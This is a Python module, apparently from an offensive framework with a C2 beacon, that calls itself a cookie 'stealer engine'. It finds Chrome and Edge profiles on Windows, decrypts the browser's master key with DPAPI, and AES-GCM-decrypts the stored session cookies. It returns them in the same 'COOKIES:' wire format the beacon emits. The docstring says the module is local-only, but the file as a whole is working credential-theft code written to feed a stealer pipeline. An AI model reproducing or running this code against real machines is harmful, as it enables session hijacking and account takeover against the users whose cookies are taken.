"""local_cookies.py — the stealer ENGINE without the beacon.

Same DPAPI + SQLite reader the C++ beacon runs (`cookies-json`), as a
standalone local module: no beacon deploy, no check-in, no C2 round
trip, no configuration. The operator's own work browser, read on the
operator's own box, feeding the SAME finding shape the beacon path
produces — downstream (jar, recon, redact, reports) cannot tell them
apart, which is exactly the point: one contract, two transports.

Safety posture (local-only by construction):

* inputs are files under %LOCALAPPDATA% (Chrome/Edge); the ONLY
  imports are stdlib + `cryptography` (already a hard dependency).
  No sockets, no subprocess, no HTTP — a network-capable import here
  is a bug, pinned by test;
* the browser SQLite file is COPIED to temp first (never locked,
  never written) and the copy is unlinked in a finally;
* values live in memory + the WorldModel finding like every other
  stealer output, under the SAME protections (redact carve-out,
  stream summaries, gitignored session files). Nothing new is
  invented for storage because nothing new is needed.
"""
from __future__ import annotations

import base64
import json
import os
import shutil
import sqlite3
import tempfile
from typing import Dict, List, Optional

_BROWSER_PATHS = (
    ("chrome", ("Google", "Chrome", "User Data")),
    ("edge", ("Microsoft", "Edge", "User Data")),
)

_DB_NAMES = ("Cookies",)
_STATE_FILE = "Local State"


def _localappdata() -> str:
    return os.environ.get("LOCALAPPDATA", "") or ""


def _dpapi_decrypt(blob: bytes) -> bytes:
    """Windows DPAPI user-context decrypt (this user, this box only)."""
    import ctypes
    from ctypes import wintypes

    class _Blob(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD),
                    ("pbData", wintypes.LPBYTE)]

    buf_in = ctypes.create_string_buffer(blob)
    blob_in = _Blob(len(blob), ctypes.cast(buf_in, wintypes.LPBYTE))
    blob_out = _Blob()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0,
            ctypes.byref(blob_out)):
        raise OSError("CryptUnprotectData failed")
    try:
        out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return bytes(out)


def _master_key(user_data: str):
    """AES master key from Chrome/Edge Local State (DPAPI-wrapped)."""
    path = os.path.join(user_data, _STATE_FILE)
    try:
        with open(path, "r", encoding="utf-8") as fh:
            state = json.load(fh)
        b64 = state.get("os_crypt", {}).get("encrypted_key", "")
        raw = base64.b64decode(b64)
    except (OSError, ValueError, KeyError, TypeError):
        return None
    if not raw.startswith(b"DPAPI"):
        return None
    try:
        return _dpapi_decrypt(raw[5:])
    except OSError:
        return None


def _decrypt_value(enc: bytes, master: Optional[bytes]) -> str:
    if not enc:
        return ""
    if enc[:3] in (b"v10", b"v11") and master:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            # v10 blob: b"v10" + 12-byte nonce + ciphertext + 16-byte tag
            nonce, ct = enc[3:15], enc[15:]
            return AESGCM(master).decrypt(nonce, ct, None).decode(
                "utf-8", "replace")
        except Exception:
            return ""
    if enc[:3] in (b"v10", b"v11"):
        return ""  # modern blob, no usable master key on this box
    try:
        return _dpapi_decrypt(bytes(enc)).decode("utf-8", "replace")
    except OSError:
        return ""


def _iter_profiles(user_data: str):
    yield "Default"
    try:
        for entry in sorted(os.listdir(user_data)):
            if entry.startswith("Profile ") and os.path.isdir(
                    os.path.join(user_data, entry)):
                yield entry
    except OSError:
        return


def read_browser_cookies(base_dir: str = "",
                         domains: Optional[List[str]] = None,
                         max_cookies: int = 500) -> List[dict]:
    """Read Chrome/Edge session cookies on THIS Windows box.

    Returns beacon-compatible entries [{host,name,path,value}] (values
    truncated like the beacon path). Non-Windows, missing browser, or
    locked/unreadable files -> [] (never raises). `domains` optionally
    restricts to suffixes (["instagram.com"]); empty = everything the
    stealer would report.
    """
    if os.name != "nt":
        return []
    root = base_dir or _localappdata()
    if not root:
        return []
    wanted = [d.lower().lstrip(".") for d in (domains or []) if d]
    out: List[dict] = []
    for _browser, parts in _BROWSER_PATHS:
        user_data = os.path.join(root, *parts)
        if not os.path.isdir(user_data):
            continue
        master = _master_key(user_data)
        for profile in _iter_profiles(user_data):
            for db_name in _DB_NAMES:
                db = os.path.join(user_data, profile, "Network", db_name)
                if not os.path.isfile(db):
                    db = os.path.join(user_data, profile, db_name)
                if not os.path.isfile(db):
                    continue
                tmp = ""
                try:
                    fd, tmp = tempfile.mkstemp(prefix="phantom-cookies-",
                                               suffix=".db")
                    os.close(fd)
                    shutil.copyfile(db, tmp)
                    con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
                    try:
                        rows = con.execute(
                            "SELECT host_key, name, path, value, "
                            "encrypted_value FROM cookies")
                        for host, name, path, value, enc in rows:
                            host = str(host or "").lower()
                            if wanted and not any(
                                    host == w or host.endswith("." + w)
                                    for w in wanted):
                                continue
                            plain = str(value or "")
                            if not plain and enc:
                                plain = _decrypt_value(bytes(enc), master)
                            if not plain or not name:
                                continue
                            out.append({"host": host,
                                        "name": str(name),
                                        "path": str(path or "/"),
                                        "value": plain[:400]})
                            if len(out) >= max_cookies:
                                return out
                    finally:
                        con.close()
                except (OSError, sqlite3.Error):
                    continue
                finally:
                    try:
                        if tmp:
                            os.remove(tmp)
                    except OSError:
                        pass
    return out


def collect_local_session(domains=None) -> tuple:
    """One-shot local collection -> (ok, COOKIES: marker lines), the same
    wire shape the beacon path emits, so the SAME interpreter turns it
    into the SAME findings. Empty box/browser -> (False, [reason])."""
    try:
        entries = read_browser_cookies(
            domains=list(domains or []) if domains else None)
    except Exception as exc:
        return False, [f"ERROR: local cookie read failed: {exc}"]
    if not entries:
        return False, ["ERROR: no local browser cookies "
                       "(Windows + Chrome/Edge expected)"]
    import json as _json
    return True, ["COOKIES:" + _json.dumps(entries[:50])]


__all__ = ["read_browser_cookies", "collect_local_session"]
